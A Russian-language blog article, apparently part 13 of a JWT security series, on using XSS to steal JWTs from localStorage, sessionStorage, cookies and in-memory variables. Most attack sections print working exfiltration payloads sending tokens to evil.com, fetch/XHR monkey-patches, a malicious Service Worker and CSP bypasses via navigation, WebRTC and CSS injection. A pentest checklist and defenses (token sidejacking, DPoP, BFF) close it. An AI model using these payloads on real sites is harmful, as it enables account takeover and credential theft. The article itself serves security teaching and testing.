---
title: "JWT, часть 13: XSS + JWT = полный захват аккаунта"
date: 2026-03-28T10:13:00+03:00
number: 13
tags: ["jwt", "security", "web", "auth"]
summary: "Нашёл Reflected XSS? Если приложение хранит JWT в localStorage, это не просто alert(1) — это захват всех аккаунтов. Разбираем кражу из каждого хранилища, CSP bypass через WebRTC и CSS injection, и единственные защиты, которые реально работают."
---

**Содержание:**
- [Шаг ноль: где лежит токен](#шаг-ноль-где-лежит-токен)
- [localStorage: одна строка JavaScript](#localstorage-одна-строка-javascript)
- [sessionStorage: то же, но привязано к вкладке](#sessionstorage-то-же-но-привязано-к-вкладке)
- [Cookie без HttpOnly: document.cookie](#cookie-без-httponly-documentcookie)
- [HttpOnly cookie: JavaScript не видит, но есть нюансы](#httponly-cookie-javascript-не-видит-но-есть-нюансы)
- [In-memory (JS-переменная): перехват через monkey-patch](#in-memory-js-переменная-перехват-через-monkey-patch)
- [CSP bypass для exfiltration](#csp-bypass-для-exfiltration)
- [Защита: Token Sidejacking и альтернативы](#защита-token-sidejacking-и-альтернативы)
- [Итог по хранилищам](#итог-по-хранилищам)
- [Что проверять на пентесте](#что-проверять-на-пентесте)
- [Что дальше](#что-дальше)

В статьях 3-8 мы подделывали JWT. Но зачем подделывать, если можно просто украсть? Нашёл Reflected XSS? Если приложение хранит JWT в localStorage, это не просто `alert(1)`. Это полный захват всех аккаунтов. И logout не поможет: JWT по умолчанию stateless, токен валиден до exp. Серверный revocation list решает проблему, но большинство реализаций его не имеют.

## Шаг ноль: где лежит токен

Прежде чем красть, надо найти. Открывай DevTools:

1. **Application > Local Storage / Session Storage**: если видишь ключ вроде `token`, `jwt`, `access_token`, это оно
2. **Application > Cookies**: смотри на флаги `HttpOnly`, `Secure`, `SameSite`. Нет `HttpOnly`? Cookie читается через `document.cookie`
3. **Network > Headers**: ищи `Authorization: Bearer` в запросах. Токен в заголовке = хранится в JS-переменной (in-memory)
4. **Console**: попробуй `localStorage.getItem('token')` и `document.cookie`

Определил хранилище, выбирай вектор из секций ниже.

## localStorage: одна строка JavaScript

Самый распространённый и самый опасный вариант хранения. JavaScript имеет полный доступ к localStorage. Одна строка, и токен у тебя:

```javascript
// Минимальный payload: image beacon
<script>
new Image().src='https://evil.com/s?t='
+btoa(localStorage.getItem('token'));
</script>
```

Оговорка: image beacon кодирует данные в URL, а URL ограничен ~8000 символами в Chrome. JWT с богатым payload (Keycloak, Azure AD) может не влезть. Для больших токенов используем POST:

```javascript
// fetch с POST
<script>
fetch('https://evil.com/s',{method:'POST',
mode:'no-cors',body:JSON.stringify({
jwt:localStorage.getItem('token'),
all:JSON.stringify(localStorage),
url:location.href})});
</script>

// sendBeacon: работает даже при закрытии вкладки
<svg onload="navigator.sendBeacon(
'https://evil.com/s',
localStorage.getItem('token'))">

// Полный дамп: не нужно знать имя ключа
<script>
var d={};
for(var i=0;i<localStorage.length;i++){
var k=localStorage.key(i);
d[k]=localStorage.getItem(k);}
navigator.sendBeacon('https://evil.com/s',
JSON.stringify(d));
</script>
```

Image beacon самый компактный и не вызывает CORS-ошибок. `sendBeacon` работает в `onload`/`onbeforeunload`, когда fetch и XHR уже не успевают. Полный дамп забирает всё содержимое localStorage без знания имён ключей.

**Не забываем про refresh token.** Он часто лежит в том же localStorage рядом с access token. Access token живёт 15 минут, refresh token неделями. Украв refresh, атакующий генерирует новые access tokens через token endpoint бесконечно, даже после смены пароля (если сервер не реализовал token rotation). Всегда дампим все ключи из storage, не только `token`.

## sessionStorage: то же, но привязано к вкладке

```javascript
<script>
fetch('https://evil.com/s',{method:'POST',
mode:'no-cors',body:JSON.stringify({
jwt:sessionStorage.getItem('token')})});
</script>
```

Ключевое отличие - данные не передаются между вкладками и уничтожаются при закрытии. Менее опасно, чем localStorage, потому что атакующий должен быть в той же вкладке. Но XSS в той же вкладке = полный доступ.

Дополнительный вектор: `window.postMessage`. Если приложение передаёт JWT через postMessage с wildcard origin (`'*'` вместо конкретного домена), любое окно может перехватить:

```javascript
// Уязвимый код приложения (проблема: '*' вместо конкретного origin):
window.parent.postMessage({token: sessionStorage.getItem('jwt')}, '*');

// Перехват на attacker.com (iframe):
window.addEventListener('message', function(e) {
  // Атакующий намеренно не проверяет e.origin: ему не важно откуда
  fetch('https://evil.com/s',{method:'POST',
  mode:'no-cors',body:JSON.stringify(e.data)});
});
```

## Cookie без HttpOnly: document.cookie

Многие приложения ставят JWT в cookie, но забывают про флаг `HttpOnly`. Проверяется элементарно: `document.cookie` в консоли. Если видишь свой токен, кража тривиальна:

```javascript
<script>
new Image().src='https://evil.com/s?c='+btoa(document.cookie);
</script>
```

Промежуточный случай между localStorage и HttpOnly cookie. Встречается часто, особенно в legacy-приложениях.

## HttpOnly cookie: JavaScript не видит, но есть нюансы

Прямая кража невозможна: `document.cookie` не возвращает HttpOnly cookie. Это реальная защита от XSS-кражи токена.

Но тут нужно понимать разницу между **same-origin XSS** и **cross-site CSRF**.

**Cross-site CSRF (атака с внешнего домена).** С Chrome 80 (февраль 2020) все cookie по умолчанию получают `SameSite=Lax`. Cross-site POST не прикрепит cookie. Вот этот код с внешнего домена **не работает** в современных браузерах:

```html
<!-- НЕ РАБОТАЕТ с SameSite=Lax (дефолт с 2020) -->
<script>
fetch('https://target.com/api/user/password',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({newPassword:'hacked123'})
});
</script>
```

`credentials:'include'` это CORS-механизм, он не обходит SameSite. Браузер просто не прикрепит cookie к cross-site POST.

**Same-origin XSS (код выполняется на домене target.com).** SameSite не помогает, потому что запрос идёт с того же origin. Если у нас XSS на target.com, мы делаем запросы от имени жертвы напрямую:

```javascript
// Same-origin XSS: SameSite НЕ защищает, cookie прикрепляется
<script>
fetch('/api/user/password',{
  method:'POST',
  credentials:'same-origin',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({newPassword:'hacked123'})
});
</script>
```

Путь относительный (`/api/...`), без домена. Запрос на тот же origin. Браузер считает его same-site и прикрепляет cookie. SameSite=Lax, SameSite=Strict: не имеет значения при same-origin XSS.

Итого по HttpOnly cookie: cross-site CSRF заблокирован SameSite=Lax (дефолт с 2020). Same-origin XSS всё ещё работает: не крадёшь токен, но выполняешь действия от имени жертвы. Для полной защиты нужен CSRF-токен даже при SameSite (defense in depth).

## In-memory (JS-переменная): перехват через monkey-patch

Токен хранится только в переменной JavaScript и отправляется через `Authorization: Bearer`. Не в localStorage, не в cookie. Казалось бы, безопасно. Но XSS даёт доступ к контексту страницы. Перехватываем:

```javascript
// Monkey-patch fetch для перехвата Authorization
const orig=window.fetch;
window.fetch=function(url,opts){
  if(opts&&opts.headers){
    var h=opts.headers;
    var a=h['Authorization']||h.get&&h.get('Authorization');
    if(a)navigator.sendBeacon('https://evil.com/s',a);
  }
  return orig.apply(this,arguments);
};

// Monkey-patch XMLHttpRequest
const origXHR=XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader=function(k,v){
  if(k==='Authorization')
    navigator.sendBeacon('https://evil.com/s',v);
  return origXHR.apply(this,arguments);
};

// Полный перехват через Headers API
// (ловит new Headers(), Request object, массивы заголовков)
const origSet=Headers.prototype.set;
Headers.prototype.set=function(k,v){
  if(k.toLowerCase()==='authorization')
    navigator.sendBeacon('https://evil.com/s',v);
  return origSet.call(this,k,v);
};
```

Жертва делает следующий API-запрос, токен из заголовка утекает. Не нужно знать, где хранится переменная.

**DPoP-токены (RFC 9449).** Monkey-patch работает и для DPoP: перехватываешь Access Token из `Authorization: DPoP` и DPoP proof из заголовка `DPoP`. Но есть нюанс. Приватный ключ DPoP хранится как `CryptoKey` с `extractable: false`, его нельзя экспортировать через JavaScript. Атакующий не может создать новые proof-ы после закрытия вкладки. Но пока жертва online, monkey-patch перехватывает готовые proof-ы и может проксировать запросы в реальном времени. Это не кража токена для offline-использования, а live session hijacking.

**Service Worker: persistent monkey-patch.** Обычный monkey-patch умирает при перезагрузке страницы. Service Worker нет. Если атакующий может зарегистрировать SW (через XSS + возможность загрузить JS-файл на тот же origin), перехват переживает закрытие вкладки, перезагрузку и даже перезапуск браузера:

```javascript
// sw.js (должен быть доступен как файл на том же origin)
self.addEventListener('fetch', function(e) {
  var auth = e.request.headers.get('Authorization');
  if (auth) {
    fetch('https://evil.com/s', {
      method: 'POST', mode: 'no-cors', body: auth
    });
  }
});

// Регистрация из XSS:
navigator.serviceWorker.register('/uploads/sw.js');
```

Порог выше, чем у обычного monkey-patch: нужен hosted JS-файл на том же origin (Service Worker не регистрируется из inline-скрипта). Но если есть file upload, это persistent token theft. Защита: заголовок `Service-Worker-Allowed` и CSP-директива `worker-src`.

## CSP bypass для exfiltration

Сервер выставил Content Security Policy? CSP контролирует не все каналы. Вот пример строгой политики:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'
```

Эта политика блокирует fetch, XHR, image beacon на чужие домены. Но у CSP есть фундаментальные слепые зоны.

**Навигация: CSP не контролирует `location.href`.**

Самый простой и надёжный bypass. Директива `navigate-to` была предложена в CSP Level 3, но **удалена из спецификации и не реализована ни в одном браузере**:

```javascript
<script>
location.href='https://evil.com/s?t='
+localStorage.getItem('token');
</script>
```

Работает против любой CSP. Минус: пользователь видит редирект. Но токен уже отправлен.

**WebRTC: обходит большинство CSP.**

CSP-директива `webrtc` существует в Chromium как эксперимент, но не стандартизирована и не используется реальными сайтами. TURN-сервер получает JWT в поле username:

```javascript
<script>
var pc=new RTCPeerConnection({iceServers:[{
  urls:'turn:evil.com:3478',
  username:localStorage.getItem('token'),
  credential:'x'}]});
pc.createOffer().then(o=>pc.setLocalDescription(o));
</script>
```

В марте 2026 года Sansec обнаружил массовую эксплуатацию WebRTC для кражи платёжных данных на крупных e-commerce сайтах. Skimmer использовал WebRTC DataChannels через DTLS-encrypted UDP, невидимый для HTTP-мониторинга. Это не теоретический вектор: он работает в production прямо сейчас.

**CSS injection: без JavaScript.**

Если `style-src` разрешает inline-стили или атакующий контролирует stylesheet, данные вытаскиваются посимвольно через CSS attribute selectors:

```css
/* Если JWT лежит в data-атрибуте или скрытом поле */
input[value^="eyJh"] { background: url(https://evil.com/?v=eyJh); }
input[value^="eyJi"] { background: url(https://evil.com/?v=eyJi); }
/* ... перебор по символам, автоматизируется скриптом */
```

Работает с `script-src 'none'`. Медленно (посимвольно), но не требует JavaScript.

**Исторические техники (не работают в 2024+):**

DNS prefetch (`link rel=dns-prefetch`): Chrome и Firefox блокируют cross-origin dns-prefetch при наличии CSP с ~2017 года. Dangling markup (`<img src="https://evil.com/?`): Chrome обрезает URL с `<` и newlines в атрибутах с Chrome 60 (2017). Оба вектора встречаются в старых материалах по CSP bypass, но полагаться на них нельзя.

## Защита: Token Sidejacking и альтернативы

Ни одно клиентское хранилище не защищает от XSS полностью. localStorage и sessionStorage: тривиальная кража. Cookie без HttpOnly: тоже. HttpOnly cookie: same-origin XSS позволяет действовать от имени жертвы. In-memory: monkey-patch.

**Token Sidejacking** (OWASP JWT Cheat Sheet): привязка JWT к браузеру через fingerprint.

1. При логине генерируем случайный fingerprint (256 бит)
2. SHA-256 хеш fingerprint-а идёт в JWT payload: `"fgp": "sha256(random)"`
3. Сам fingerprint отправляется как HttpOnly cookie: `fgp=random; HttpOnly; Secure; SameSite=Strict`
4. При каждом запросе сервер проверяет: `sha256(cookie) == jwt.fgp`

```python
import hashlib, secrets, jwt as pyjwt
from flask import make_response

def login(user):
    fgp = secrets.token_hex(32)
    fgp_hash = hashlib.sha256(fgp.encode()).hexdigest()
    token = pyjwt.encode(
        {"sub": user, "fgp": fgp_hash},
        SECRET, algorithm="HS256")
    resp = make_response({"token": token})
    resp.set_cookie("fgp", fgp,
        httponly=True, secure=True, samesite="Strict")
    return resp

def verify_request(token, cookie_fgp):
    payload = pyjwt.decode(token, SECRET, algorithms=["HS256"])
    expected = hashlib.sha256(cookie_fgp.encode()).hexdigest()
    if payload["fgp"] != expected:
        raise Exception("Fingerprint mismatch")
    return payload
```

Украл JWT через XSS? Бесполезно: HttpOnly cookie недоступен JavaScript, fingerprint не совпадёт. CSRF? Бесполезно: нужен JWT для API-запроса, а он в памяти или localStorage. Нужны ОБА компонента одновременно.

**Альтернативные подходы:**

- **DPoP (RFC 9449):** привязка токена к криптоключу клиента. Разобрано в статье 12. Приватный ключ хранится как non-extractable CryptoKey, украденный токен бесполезен без ключа
- **BFF (Backend-for-Frontend):** токен никогда не попадает в браузер. Фронтенд общается с BFF-прокси по сессионной cookie, BFF добавляет JWT к запросу на бэкенд. XSS в браузере не видит токен вообще
- **Короткоживущие токены** (30с-2мин) + token rotation: минимизируют окно эксплуатации
- **Trusted Types** (`require-trusted-types-for 'script'` в CSP): предотвращает DOM XSS на уровне браузера, блокируя прямое присвоение строк в опасные sink-и (innerHTML, eval)

## Итог по хранилищам

- **localStorage**: XSS кража тривиальна, одна строка JavaScript. Не забывай про refresh token рядом
- **sessionStorage**: XSS тривиальна, привязано к вкладке
- **Cookie без HttpOnly**: `document.cookie` так же тривиально, как localStorage
- **HttpOnly cookie + SameSite=Lax (дефолт)**: XSS кража невозможна, cross-site CSRF заблокирован. Остаётся same-origin XSS для выполнения действий от имени жертвы
- **In-memory**: monkey-patch fetch/XHR/Headers перехватывает токен. Service Worker делает перехват persistent
- **Token Sidejacking / DPoP / BFF**: привязка токена к клиенту или вынос токена из браузера

## Что проверять на пентесте

**Определение хранилища:**

1. DevTools, Application, Storage: проверь localStorage и sessionStorage
2. DevTools, Application, Cookies: флаги `HttpOnly`, `Secure`, `SameSite`
3. DevTools, Network, Headers: ищи `Authorization: Bearer` / `DPoP`
4. Console: `localStorage.getItem('token')`, `document.cookie`

**localStorage / sessionStorage:**

5. Image beacon: `new Image().src` + `btoa(token)`
6. fetch POST с `mode:'no-cors'` для больших токенов
7. Полный дамп всех ключей (не только `token`)
8. Refresh token в том же хранилище

**Cookie:**

9. Нет `HttpOnly`? Кража через `document.cookie`
10. `SameSite=Lax` (дефолт) блокирует cross-site CSRF
11. Same-origin XSS: относительные пути, `credentials:'same-origin'`

**In-memory:**

12. Monkey-patch fetch + XHR + `Headers.prototype`
13. DPoP: перехват proof-ов, ключ non-extractable
14. Service Worker registration (нужен hosted JS-файл)

**CSP bypass:**

15. `location.href`: навигация, CSP не контролирует
16. WebRTC TURN: username содержит токен
17. CSS injection при `style-src` inline

**Защиты:**

18. Token Sidejacking: fingerprint в HttpOnly cookie + hash в JWT
19. DPoP: `Authorization: DPoP` вместо Bearer
20. BFF: проверь прямой доступ к API без прокси

## Что дальше

В следующей статье: lattice-атаки. Как утечка трёх бит nonce из каждой ECDSA-подписи даёт полный приватный ключ. Понадобится математика ECDSA из статьи 9, формулы подписи и nonce reuse.
